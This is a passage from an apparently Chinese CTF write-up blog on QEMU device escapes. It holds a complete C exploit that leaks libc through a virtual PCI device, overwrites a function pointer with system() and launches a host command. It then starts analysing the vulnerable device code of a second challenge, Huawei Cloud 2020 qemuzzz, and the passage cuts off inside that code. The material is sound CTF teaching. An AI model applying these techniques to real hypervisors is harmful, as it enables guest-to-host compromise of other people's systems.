class="keyword">if</span> (ioperm(base, len, <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *grant_base = base;</span><br><span class="line">        *grant_len = len;</span><br><span class="line">        *have_ioperm = <span class="literal">true</span>;</span><br><span class="line">        *have_iopl = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *grant_base = <span class="number">0</span>;</span><br><span class="line">        *grant_len = <span class="number">0</span>;</span><br><span class="line">        *have_ioperm = <span class="literal">false</span>;</span><br><span class="line">        *have_iopl = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ====== 对外 API ====== */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * pio_init</span></span><br><span class="line"><span class="comment"> *   bdf_or_path : &quot;0000:bb:dd.f&quot; 形式的 BDF；或直接传 resource 的绝对路径</span></span><br><span class="line"><span class="comment"> *   bar_idx     : 0..5 指定 BAR；传 -1 自动挑选第一个 PIO BAR</span></span><br><span class="line"><span class="comment"> * 返回 0 成功，-1 失败（查看 errno）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pio_init</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* bdf_or_path, <span class="type">int</span> bar_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_pio.inited)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EALREADY;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint16_t</span> base = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (parse_io_bar(bdf_or_path, bar_idx, &amp;base, &amp;size) != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint16_t</span> gbase = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> glen = <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> have_perm = <span class="literal">false</span>, have_iopl = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (acquire_io_priv(base, size, &amp;gbase, &amp;glen, &amp;have_perm, &amp;have_iopl) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    g_pio.base = base;</span><br><span class="line">    g_pio.size = size;</span><br><span class="line">    g_pio.grant_base = gbase;</span><br><span class="line">    g_pio.grant_len = glen;</span><br><span class="line">    g_pio.have_ioperm = have_perm;</span><br><span class="line">    g_pio.have_iopl = have_iopl;</span><br><span class="line">    g_pio.inited = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 收尾：撤销 ioperm；iopl 切回 0（可忽略失败，进程退出也会复原） */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pio_fini</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_pio.inited) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (g_pio.have_ioperm) (<span class="type">void</span>)ioperm(g_pio.grant_base, g_pio.grant_len, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (g_pio.have_iopl) (<span class="type">void</span>)iopl(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;g_pio, <span class="number">0</span>, <span class="keyword">sizeof</span>(g_pio));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 查询已初始化的基址/大小（方便打印或检查） */</span></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">pio_base</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_pio.base; &#125;</span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pio_size</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_pio.size; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 内部：计算端口号 + 越界检查 */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">pio_port</span><span class="params">(<span class="type">uint32_t</span> off, <span class="type">int</span> width, <span class="type">uint16_t</span>* port_out)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_pio.inited)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EPERM;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">uint64_t</span>)off + (<span class="type">uint64_t</span>)width &gt; g_pio.size)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = ERANGE;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">uint32_t</span> p = (<span class="type">uint32_t</span>)g_pio.base + off;</span><br><span class="line">    <span class="keyword">if</span> (p &gt; <span class="number">0xFFFF</span>u)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = ERANGE;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *port_out = (<span class="type">uint16_t</span>)p;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 读写 API —— 8/16/32 位 */</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">pio_read8</span><span class="params">(<span class="type">uint32_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> p;</span><br><span class="line">    <span class="keyword">if</span> (pio_port(off, <span class="number">1</span>, &amp;p)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> inb(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">pio_read16</span><span class="params">(<span class="type">uint32_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> p;</span><br><span class="line">    <span class="keyword">if</span> (pio_port(off, <span class="number">2</span>, &amp;p)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> inw(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pio_read32</span><span class="params">(<span class="type">uint32_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> p;</span><br><span class="line">    <span class="keyword">if</span> (pio_port(off, <span class="number">4</span>, &amp;p)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> inl(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pio_write8</span><span class="params">(<span class="type">uint32_t</span> off, <span class="type">uint8_t</span> v)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> p;</span><br><span class="line">    <span class="keyword">if</span> (pio_port(off, <span class="number">1</span>, &amp;p)) <span class="keyword">return</span>;</span><br><span class="line">    outb(v, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pio_write16</span><span class="params">(<span class="type">uint32_t</span> off, <span class="type">uint16_t</span> v)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> p;</span><br><span class="line">    <span class="keyword">if</span> (pio_port(off, <span class="number">2</span>, &amp;p)) <span class="keyword">return</span>;</span><br><span class="line">    outw(v, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pio_write32</span><span class="params">(<span class="type">uint32_t</span> off, <span class="type">uint32_t</span> v)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> p;</span><br><span class="line">    <span class="keyword">if</span> (pio_port(off, <span class="number">4</span>, &amp;p)) <span class="keyword">return</span>;</span><br><span class="line">    outl(v, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">tea_encrypt</span><span class="params">(<span class="type">uint64_t</span>* val, <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> val_hi = *val &gt;&gt; <span class="number">32</span>, val_lw = *val;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>; delta != <span class="number">0x6526b0d9</span>; delta -= <span class="number">0x61C88647</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        val_lw += (delta + val_hi) ^ (key[<span class="number">1</span>] + (val_hi &gt;&gt; <span class="number">5</span>)) ^ (key[<span class="number">0</span>] + (val_hi &lt;&lt; <span class="number">4</span>));</span><br><span class="line">        val_hi += (delta + val_lw) ^ (key[<span class="number">3</span>] + (val_lw &gt;&gt; <span class="number">5</span>)) ^ (key[<span class="number">2</span>] + (val_lw &lt;&lt; <span class="number">4</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    *val = (<span class="number">1ULL</span> * val_hi &lt;&lt; <span class="number">32</span>) | val_lw;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">tea_decrypt</span><span class="params">(<span class="type">uint64_t</span>* val, <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> val_hi = *val &gt;&gt; <span class="number">32</span>, val_lw = *val;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> delta = <span class="number">0xC6EF3720</span>; delta; delta += <span class="number">0x61C88647</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        val_hi -= (delta + val_lw) ^ (key[<span class="number">3</span>] + (val_lw &gt;&gt; <span class="number">5</span>)) ^ (key[<span class="number">2</span>] + (val_lw &lt;&lt; <span class="number">4</span>));</span><br><span class="line">        val_lw -= (delta + val_hi) ^ (key[<span class="number">1</span>] + (val_hi &gt;&gt; <span class="number">5</span>)) ^ (key[<span class="number">0</span>] + (val_hi &lt;&lt; <span class="number">4</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    *val = (<span class="number">1ULL</span> * val_hi &lt;&lt; <span class="number">32</span>) | val_lw;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    mmio_init(<span class="string">&quot;0000:00:03.0&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    pio_init(<span class="string">&quot;0000:00:03.0&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    pio_write32(<span class="number">4</span>, <span class="number">0x114514</span>); <span class="comment">// key = &#123;0, 0, 0, 0&#125;</span></span><br><span class="line"></span><br><span class="line">    pio_write32(<span class="number">0x8</span>, <span class="number">0x100</span>); <span class="comment">// seek = 0x100</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> lo = mmio_read32(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">uint32_t</span> hi = mmio_read32(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">uint64_t</span> rand_r_addr = ((<span class="type">uint64_t</span>)hi &lt;&lt; <span class="number">32</span>) | lo;</span><br><span class="line"></span><br><span class="line">    tea_encrypt(&amp;rand_r_addr, (<span class="type">uint32_t</span>[])&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] rand_r addr: %p\n&quot;</span>, rand_r_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> libc_base = rand_r_addr - <span class="number">0x48d30</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] libc base: %p\n&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> system_addr = libc_base + <span class="number">0x53290</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] system addr: %p\n&quot;</span>, system_addr);</span><br><span class="line"></span><br><span class="line">    tea_decrypt(&amp;system_addr, (<span class="type">uint32_t</span>[])&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line"></span><br><span class="line">    mmio_write32(<span class="number">0x18</span>, system_addr);</span><br><span class="line">    mmio_write32(<span class="number">0x18</span>, system_addr &gt;&gt; <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    pio_write32(<span class="number">0x8</span>, <span class="number">0</span>); <span class="comment">// seek = 0</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> cmd[] = <span class="string">&quot;/usr/bin/gnome-calculator&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">4</span>; i &lt; <span class="keyword">sizeof</span>(cmd); i += <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint64_t</span> val = *(<span class="type">uint64_t</span>*)&amp;cmd[i];</span><br><span class="line">        tea_decrypt(&amp;val, (<span class="type">uint32_t</span>[])&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">        mmio_write32(i, val);</span><br><span class="line">        mmio_write32(i, val &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pio_write32(<span class="number">0x1C</span>, *(<span class="type">uint32_t</span>*)cmd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="华为云2020-qemuzzz"><a href="#华为云2020-qemuzzz" class="headerlink" title="华为云2020 qemuzzz"></a>华为云2020 qemuzzz</h1><h2 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/osdep.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/pci/pci.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qapi/error.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;exec/memory.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;exec/cpu-common.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/pci/pci_regs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TYPE_ZZZ <span class="string">&quot;zzz&quot;</span></span></span><br><span class="line">OBJECT_DECLARE_SIMPLE_TYPE(ZZZState, ZZZ)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* MMIO register offsets (from the decompiled logic) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZZZ_REG_OFFSET  0x10  <span class="comment">/* 16-bit offset into buf */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZZZ_REG_LEN     0x18  <span class="comment">/* 16-bit len; bit15 as IRQ flag; LSB decides RW */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZZZ_REG_ADDR    0x20  <span class="comment">/* target phys addr (val &lt;&lt; 12) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZZZ_CMD_XOR     0x50  <span class="comment">/* XOR buf region with 0x0209 (16-bit stride) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZZZ_CMD_KICK    0x60  <span class="comment">/* trigger DMA using cpu_physical_memory_rw */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZZZ_BAR0_SIZE   0x100000 <span class="comment">/* 1 MiB BAR */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZZZ_BUF_SIZE    0x1000   <span class="comment">/* 4 KiB internal buffer */</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ZZZState</span> &#123;</span></span><br><span class="line">    PCIDevice parent_obj;</span><br><span class="line"></span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    hwaddr addr;         <span class="comment">/* target physical address (page-aligned by &lt;&lt;12) */</span></span><br><span class="line">    <span class="type">uint16_t</span> len;        <span class="comment">/* operation length (and flags) */</span></span><br><span class="line">    <span class="type">uint16_t</span> offset;     <span class="comment">/* offset inside buf */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int16_t</span>  rsvd0;  <span class="comment">/* kept to mirror layout (unused) */</span></span><br><span class="line">    <span class="type">int16_t</span>  rsvd1;  <span class="comment">/* kept to mirror layout (unused) */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>  buf[ZZZ_BUF_SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ZZZState</span> *<span class="title">opaque</span>;</span></span><br><span class="line">    <span class="type">void</span> (*cpu_physical_memory_rw)(hwaddr, <span class="type">uint8_t</span> *, hwaddr, <span class="type">int</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---------- MMIO callbacks ---------- */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">zzz_mmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    ZZZState *s = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Only 0..0xFFF returns buffered byte; others return 0 */</span></span><br><span class="line">    <span class="keyword">if</span> (addr &lt;= <span class="number">0xFFF</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> s-&gt;buf[addr];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">zzz_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    ZZZState *s = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> ZZZ_REG_ADDR:</span><br><span class="line">        s-&gt;addr = ((hwaddr)val) &lt;&lt; <span class="number">12</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> ZZZ_REG_OFFSET:</span><br><span class="line">        <span class="keyword">if</span> (val &gt; <span class="number">0x0FFF</span>u) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s-&gt;offset &gt; <span class="number">0x0FFF</span>u) &#123;</span><br><span class="line">                s-&gt;offset = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            s-&gt;offset = (<span class="type">uint16_t</span>)val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> ZZZ_REG_LEN:</span><br><span class="line">        <span class="comment">/* len register is taken as 16-bit */</span></span><br><span class="line">        s-&gt;len = (<span class="type">uint16_t</span>)val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> ZZZ_CMD_XOR: &#123;</span><br><span class="line">        <span class="type">uint32_t</span> off  = s-&gt;offset;</span><br><span class="line">        <span class="type">int</span>      len0 = (<span class="type">int</span>)(s-&gt;len &amp; <span class="number">0x7FFE</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">int</span>)off + len0 &gt;= <span class="number">0x1000</span>) &#123;</span><br><span class="line">            len0 = <span class="number">4095</span> - (<span class="type">int</span>)off;  <span class="comment">/* keep inside 0..0xFFF, end == 0x1000 */</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* iterate len0/2 16-bit elements starting at buf + off */</span></span><br><span class="line">        <span class="type">int</span> words = len0 &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; words; ++j) &#123;</span><br><span class="line">            <span class="type">uint16_t</span> *p = (<span class="type">uint16_t</span> *)(s-&gt;buf + off + (j * <span class="number">2</span>));</span><br><span class="line">            *p ^= <span class="number">0x0209</span>u;  <span class="comment">/* <span class="doctag">NOTE:</span> decompiled comment had 0x290, code is 0x209 */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> ZZZ_CMD_KICK: &#123;</span><br><span class="line">        ZZZState *t = s-&gt;opaque;</span><br><span class="line">        <span class="keyword">if</span> ((t-&gt;addr &amp; <span class="number">0xFFF</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int16_t</span>  len1 = (<span class="type">int16_t</span>)t-&gt;len;</span><br><span class="line">            <span class="type">uint32_t</span> off  = t-&gt;offset;</span><br><span class="line">            <span class="type">uint16_t</span> l    = (<span class="type">uint16_t</span>)(len1 &amp; <span class="number">0x7FFE</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">int</span>)(off + (<span class="type">uint32_t</span>)(len1 &amp; <span class="number">0x7FFE</span>) - <span class="number">1</span>) &lt;= <span class="number">0x1000</span>) &#123;</span><br><span class="line">                <span class="type">uint8_t</span> *buf = &amp;t-&gt;buf[off];</span><br><span class="line">                <span class="type">void</span> (*fn)(hwaddr, <span class="type">uint8_t</span> *, hwaddr, <span class="type">int</span>) = s-&gt;cpu_physical_memory_rw;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (len1 &amp; <span class="number">1</span>) &#123;</span><br><span class="line">                    fn(t-&gt;addr, buf, l, <span class="number">1</span>);  <span class="comment">/* write system memory (device -&gt; host) */</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    fn(t-&gt;addr, buf, l, <span class="number">0</span>);  <span class="comment">/* read system memory (host -&gt; device) */</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ((<span class="type">int16_t</span>)t-&gt;len &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    pci_set_irq(&amp;t-&gt;parent_obj, <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">/* other addresses ignored */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---------- QOM / PCI boilerplate ---------- */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps zzz_mmio_ops = &#123;</span><br><span class="line">    .read = zzz_mmio_read,</span><br><span class="line">    .write = zzz_mmio_write,</span><br><span class="line">    .endianness = DEVICE_NATIVE_ENDIAN,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">zzz_instance_init</span><span class="params">(Object *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">    ZZZState *s = ZZZ(obj);</span><br><span class="line">    s-&gt;opaque = s; </span><br><span class="line">    s-&gt;cpu_physical_memory_rw = cpu_physical_memory_rw;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_zzz_realize</span><span class="params">(PCIDevice *pdev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    ZZZState *s = ZZZ(pdev);</span><br><span class="line"></span><br><span class="line">    pdev-&gt;config[PCI_INTERRUPT_PIN] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;s-&gt;mmio, OBJECT(s), &amp;zzz_mmio_ops, s,</span><br><span class="line">                          <span class="string">&quot;zzz-mmio&quot;</span>, ZZZ_BAR0_SIZE);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;s-&gt;mmio);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_zzz_uninit</span><span 